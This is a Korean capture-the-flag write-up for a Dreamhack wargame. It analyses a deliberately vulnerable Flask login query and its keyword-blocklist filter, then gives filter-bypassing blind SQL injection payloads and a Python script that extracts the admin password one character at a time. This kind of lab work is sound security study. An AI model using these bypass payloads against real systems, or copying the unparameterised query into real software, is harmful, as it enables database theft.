# [Dreamhack Wargame] sql injection bypass WAF Advanced
### [🚩sql injection bypass WAF advanced](https://dreamhack.io/wargame/challenges/416/)
  <img width="1073" alt="bypassWAF-advanced_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/61d8a907-3af8-4f47-9587-e513f217c733">

<br/><br/>

## 문제 파일 분석
### init.sql
```sql
CREATE DATABASE IF NOT EXISTS `users`; -- users 데이터베이스가 존재하지 않을 경우 CREATE DATABASE로 생성함
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass'; -- 권한 설정

USE `users`;
CREATE TABLE user( -- CREATE TABLE로 user 테이블 생성 (열: idx, uid, upw)
  idx int auto_increment primary key, -- auto_increment (시작값은 1, 새로운 행이 추가될 때마다 1씩 자동 증가)
  uid varchar(128) not null,
  upw varchar(128) not null
);

-- user 테이블에 INSERT INTO 구문을 통해 adcde, admin, guest, test, dream 계정과 각 계정의 비밀번호를 삽입함
INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```
* init.sql 실행 결과로 생성된 users 데이터베이스의 user xpdlqmf
    | idx(primary key) | uid | upw |
    |:---:|---|---|
    | 1 | 'abcde' | '1234' |
    | 2 | 'admin' | 플래그 |
    | 3 | 'guest' | 'guest' |
    | 4 | 'test' | 'test' |
    | 5 | 'dream' | 'hack' |

<br/>

### app.py
```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

# Flask와 mysql을 이용한 웹 서버가 동작하고 있음
app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+'] # 필터링할 키워드 목록
def check_WAF(data): # 필터링 함수 (목록에 포함된 키워드들이 존재하는지 검사함)
    for keyword in keywords:
        if keyword in data.lower(): # 필터링 키워드 검사 시 소문자로 모두 변환한 후 검사 (대소문자 혼용을 이용한 필터링 우회 방지)
            return True # 필터링 키워드가 존재하면 True를 반환함
    return False # 필터링 키워드가 존재하지 않으면 False를 반환함


# 인덱스 페이지
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid') # 이용자가 전달한 uid 입력값을 가져옴
    if uid: # uid 인자값이 존재하는 경우 (/?uid= 뒤에 값이 존재함)
        # 필터링할 키워드가 포함되어 있는지 검사하여 존재할 경우 WAF에 의해 요청이 막혔다는 메시지를 출력함
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        
        # 필터링 키워드가 요청에 포함되지 않을 경우 아래의 코드를 실행함
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';") # uid를 이용해 user 테이블을 조회하는 쿼리문을 생성하고 실행함
        result = cur.fetchone()
        
        if result: # 결과는 조건에 해당하는 행 전체를 반환 (행의 idx, uid, upw)
            return template.format(uid=uid, result=result[1]) # 반환되는 결과 중 두 번째에 해당하는 열의 값을 화면에 출력함
        else: # 결과가 존재하지 않을 경우
            return template.format(uid=uid, result='')

    else:
        return template # uid 인자값이 존재하지 않으면 template 변수의 내용을 그대로 출력함


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
모두 소문자로 변환하여 특정 필터링 키워드를 포함하는지 검사한 후, 검사를 통과하면 이용자가 uid가 mysql 쿼리에 삽입되어 실행되기 때문에 이를 우회하면 SQL Injection을 수행할 수 있음
* 모두 소문자로 변환하여 검사를 진행하기 때문에 대소문자 혼용 방식으로 검사를 우회할 수 없음
    - SQL Injection에 용이하게 사용되는 ```union```, ```select```, ```from```을 사용하지 못하므로 Blind SQL Injection을 이용해 admin 계정의 비밀번호를 한 자리씩 알아내야 함
    - Blind SQL Injection이 수행 가능한지 확인하기 위한 uid 입력값
        ```sql
        -- 원래 uid 입력값: ' OR (uid = 'guest' AND SUBSTR(upw, 1, 1) = 'g')--
        '||(uid=CONCAT('gu','est')&&SUBSTR(upw,1,1)='g')#
        ```
        + ```and```, ```or```가 필터링되고 있으므로 이를 각각 ```&&```과 ```||```으로 대체함
        + ```admin```을 필터링하고 있으므로 문자열 결합 함수인 ```CONCAT```을 사용하여 문자열 검사를 우회함
        + ```-```를 필터링하고 있으므로 한 줄 주석인 ```--```를 사용하지 못하므로 ```#```으로 대체하여 실행함
      <img width="1484" alt="확인uid" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/d815a3f0-605b-4b7a-9a7e-2477bede3717">


<br/><br/>

### 익스플로잇
1. Blind SQL Injection 공격을 수행할 때 입력해야 하는 uid를 작성하고 사이트에서 이를 확인함
    ```sql
    -- 필터링 우회하기 전 uid 입력값: ' OR (uid = 'admin' AND SUBSTR(upw, 1, 1) = 'D')--
    '||(uid=CONCAT('ad','min')&&SUBSTR(upw,1,1)='D')#
    ```
    + 실행 결과 admin 문자열이 화면에 출력됨을 알 수 있음 → 해당 쿼리에서 ```SUBSTR```의 두 번째 인자의 값과 비교하는 문자을 변경시켜가며 Blind SQL Injection 공격을 수행함
        <img width="1484" alt="공격uid" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/04ec1816-68fb-46ce-8969-3212ecb5d201">


2. Blind SQL Injection 공격을 자동화하는 스크립트(bypass_WAF_exploit.py)를 작성함
    ```python
    from requests import get # 파이썬의 requests 모듈을 이용
    from bs4 import BeautifulSoup

    host = "http://host3.dreamhack.games:21984/" # host는 문제의 접속 정보에 따라 변경함

    length = 1 # 플래그(admin 패스워드)의 길이
    password = '' # admin 패스워드(플래그)
    char = '' # 대소문자 구분

    while True:
        for c in range(48, 126): # 비교할 값의 범위를 ASCII 값으로 한정
            # blind sql injection 공격 쿼리 (URL Encode 수행)
            # URL 인코딩 전 쿼리: '||(uid=CONCAT('ad','min')&&SUBSTR(upw,len,1)='c')#
            query="%27%7C%7C%28uid%3DCONCAT%28%27ad%27%2C%27min%27%29%26%26SUBSTR%28upw%2C"+str(length)+"%2C1%29%3D%27"+chr(c)+"%27%29%23"
            r = get(f"{host}/?uid={query}")
            
            # 공격 성공 시 결과 (<pre>,</pre> 태그에 결과(admin)가 출력되기 때문에 pre 태그 내에 admin이 출력되는지 확인해야 함)
            html = r.text
            soup = BeautifulSoup(html, "html.parser")
            pre_tag = soup.find_all('pre')
            
            if pre_tag and 'admin' in pre_tag[1]:
                if (c >= 65 and c <= 90): # 쿼리를 모두 소문자로 변환하여 출력하므로 쿼리에 c의 값으로 영문 대문자가 아니라 소문자 값으로 들어가게 됨
                    c += 32 # 아스키코드 → 대문자 + 32 = 소문자
                password += chr(c)
                print(f"length: {length}, password: {password}")
                length = int(length) + 1
                break
        
        # 플래그의 형식이 'DH{...}'이므로 password의 마지막 문자가 '}'이면 반복문을 탈출함
        if password[-1] == '}':
            break

    print(f"FLAG: {password}")
    ```

4. 공격 자동화 스크립트를 실행하면 다음과 같이 쿼리를 획득할 수 있음
    <img width="759" alt="실행결과" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/f9aeaa20-f4ee-4bae-8b22-06b2221890ff">
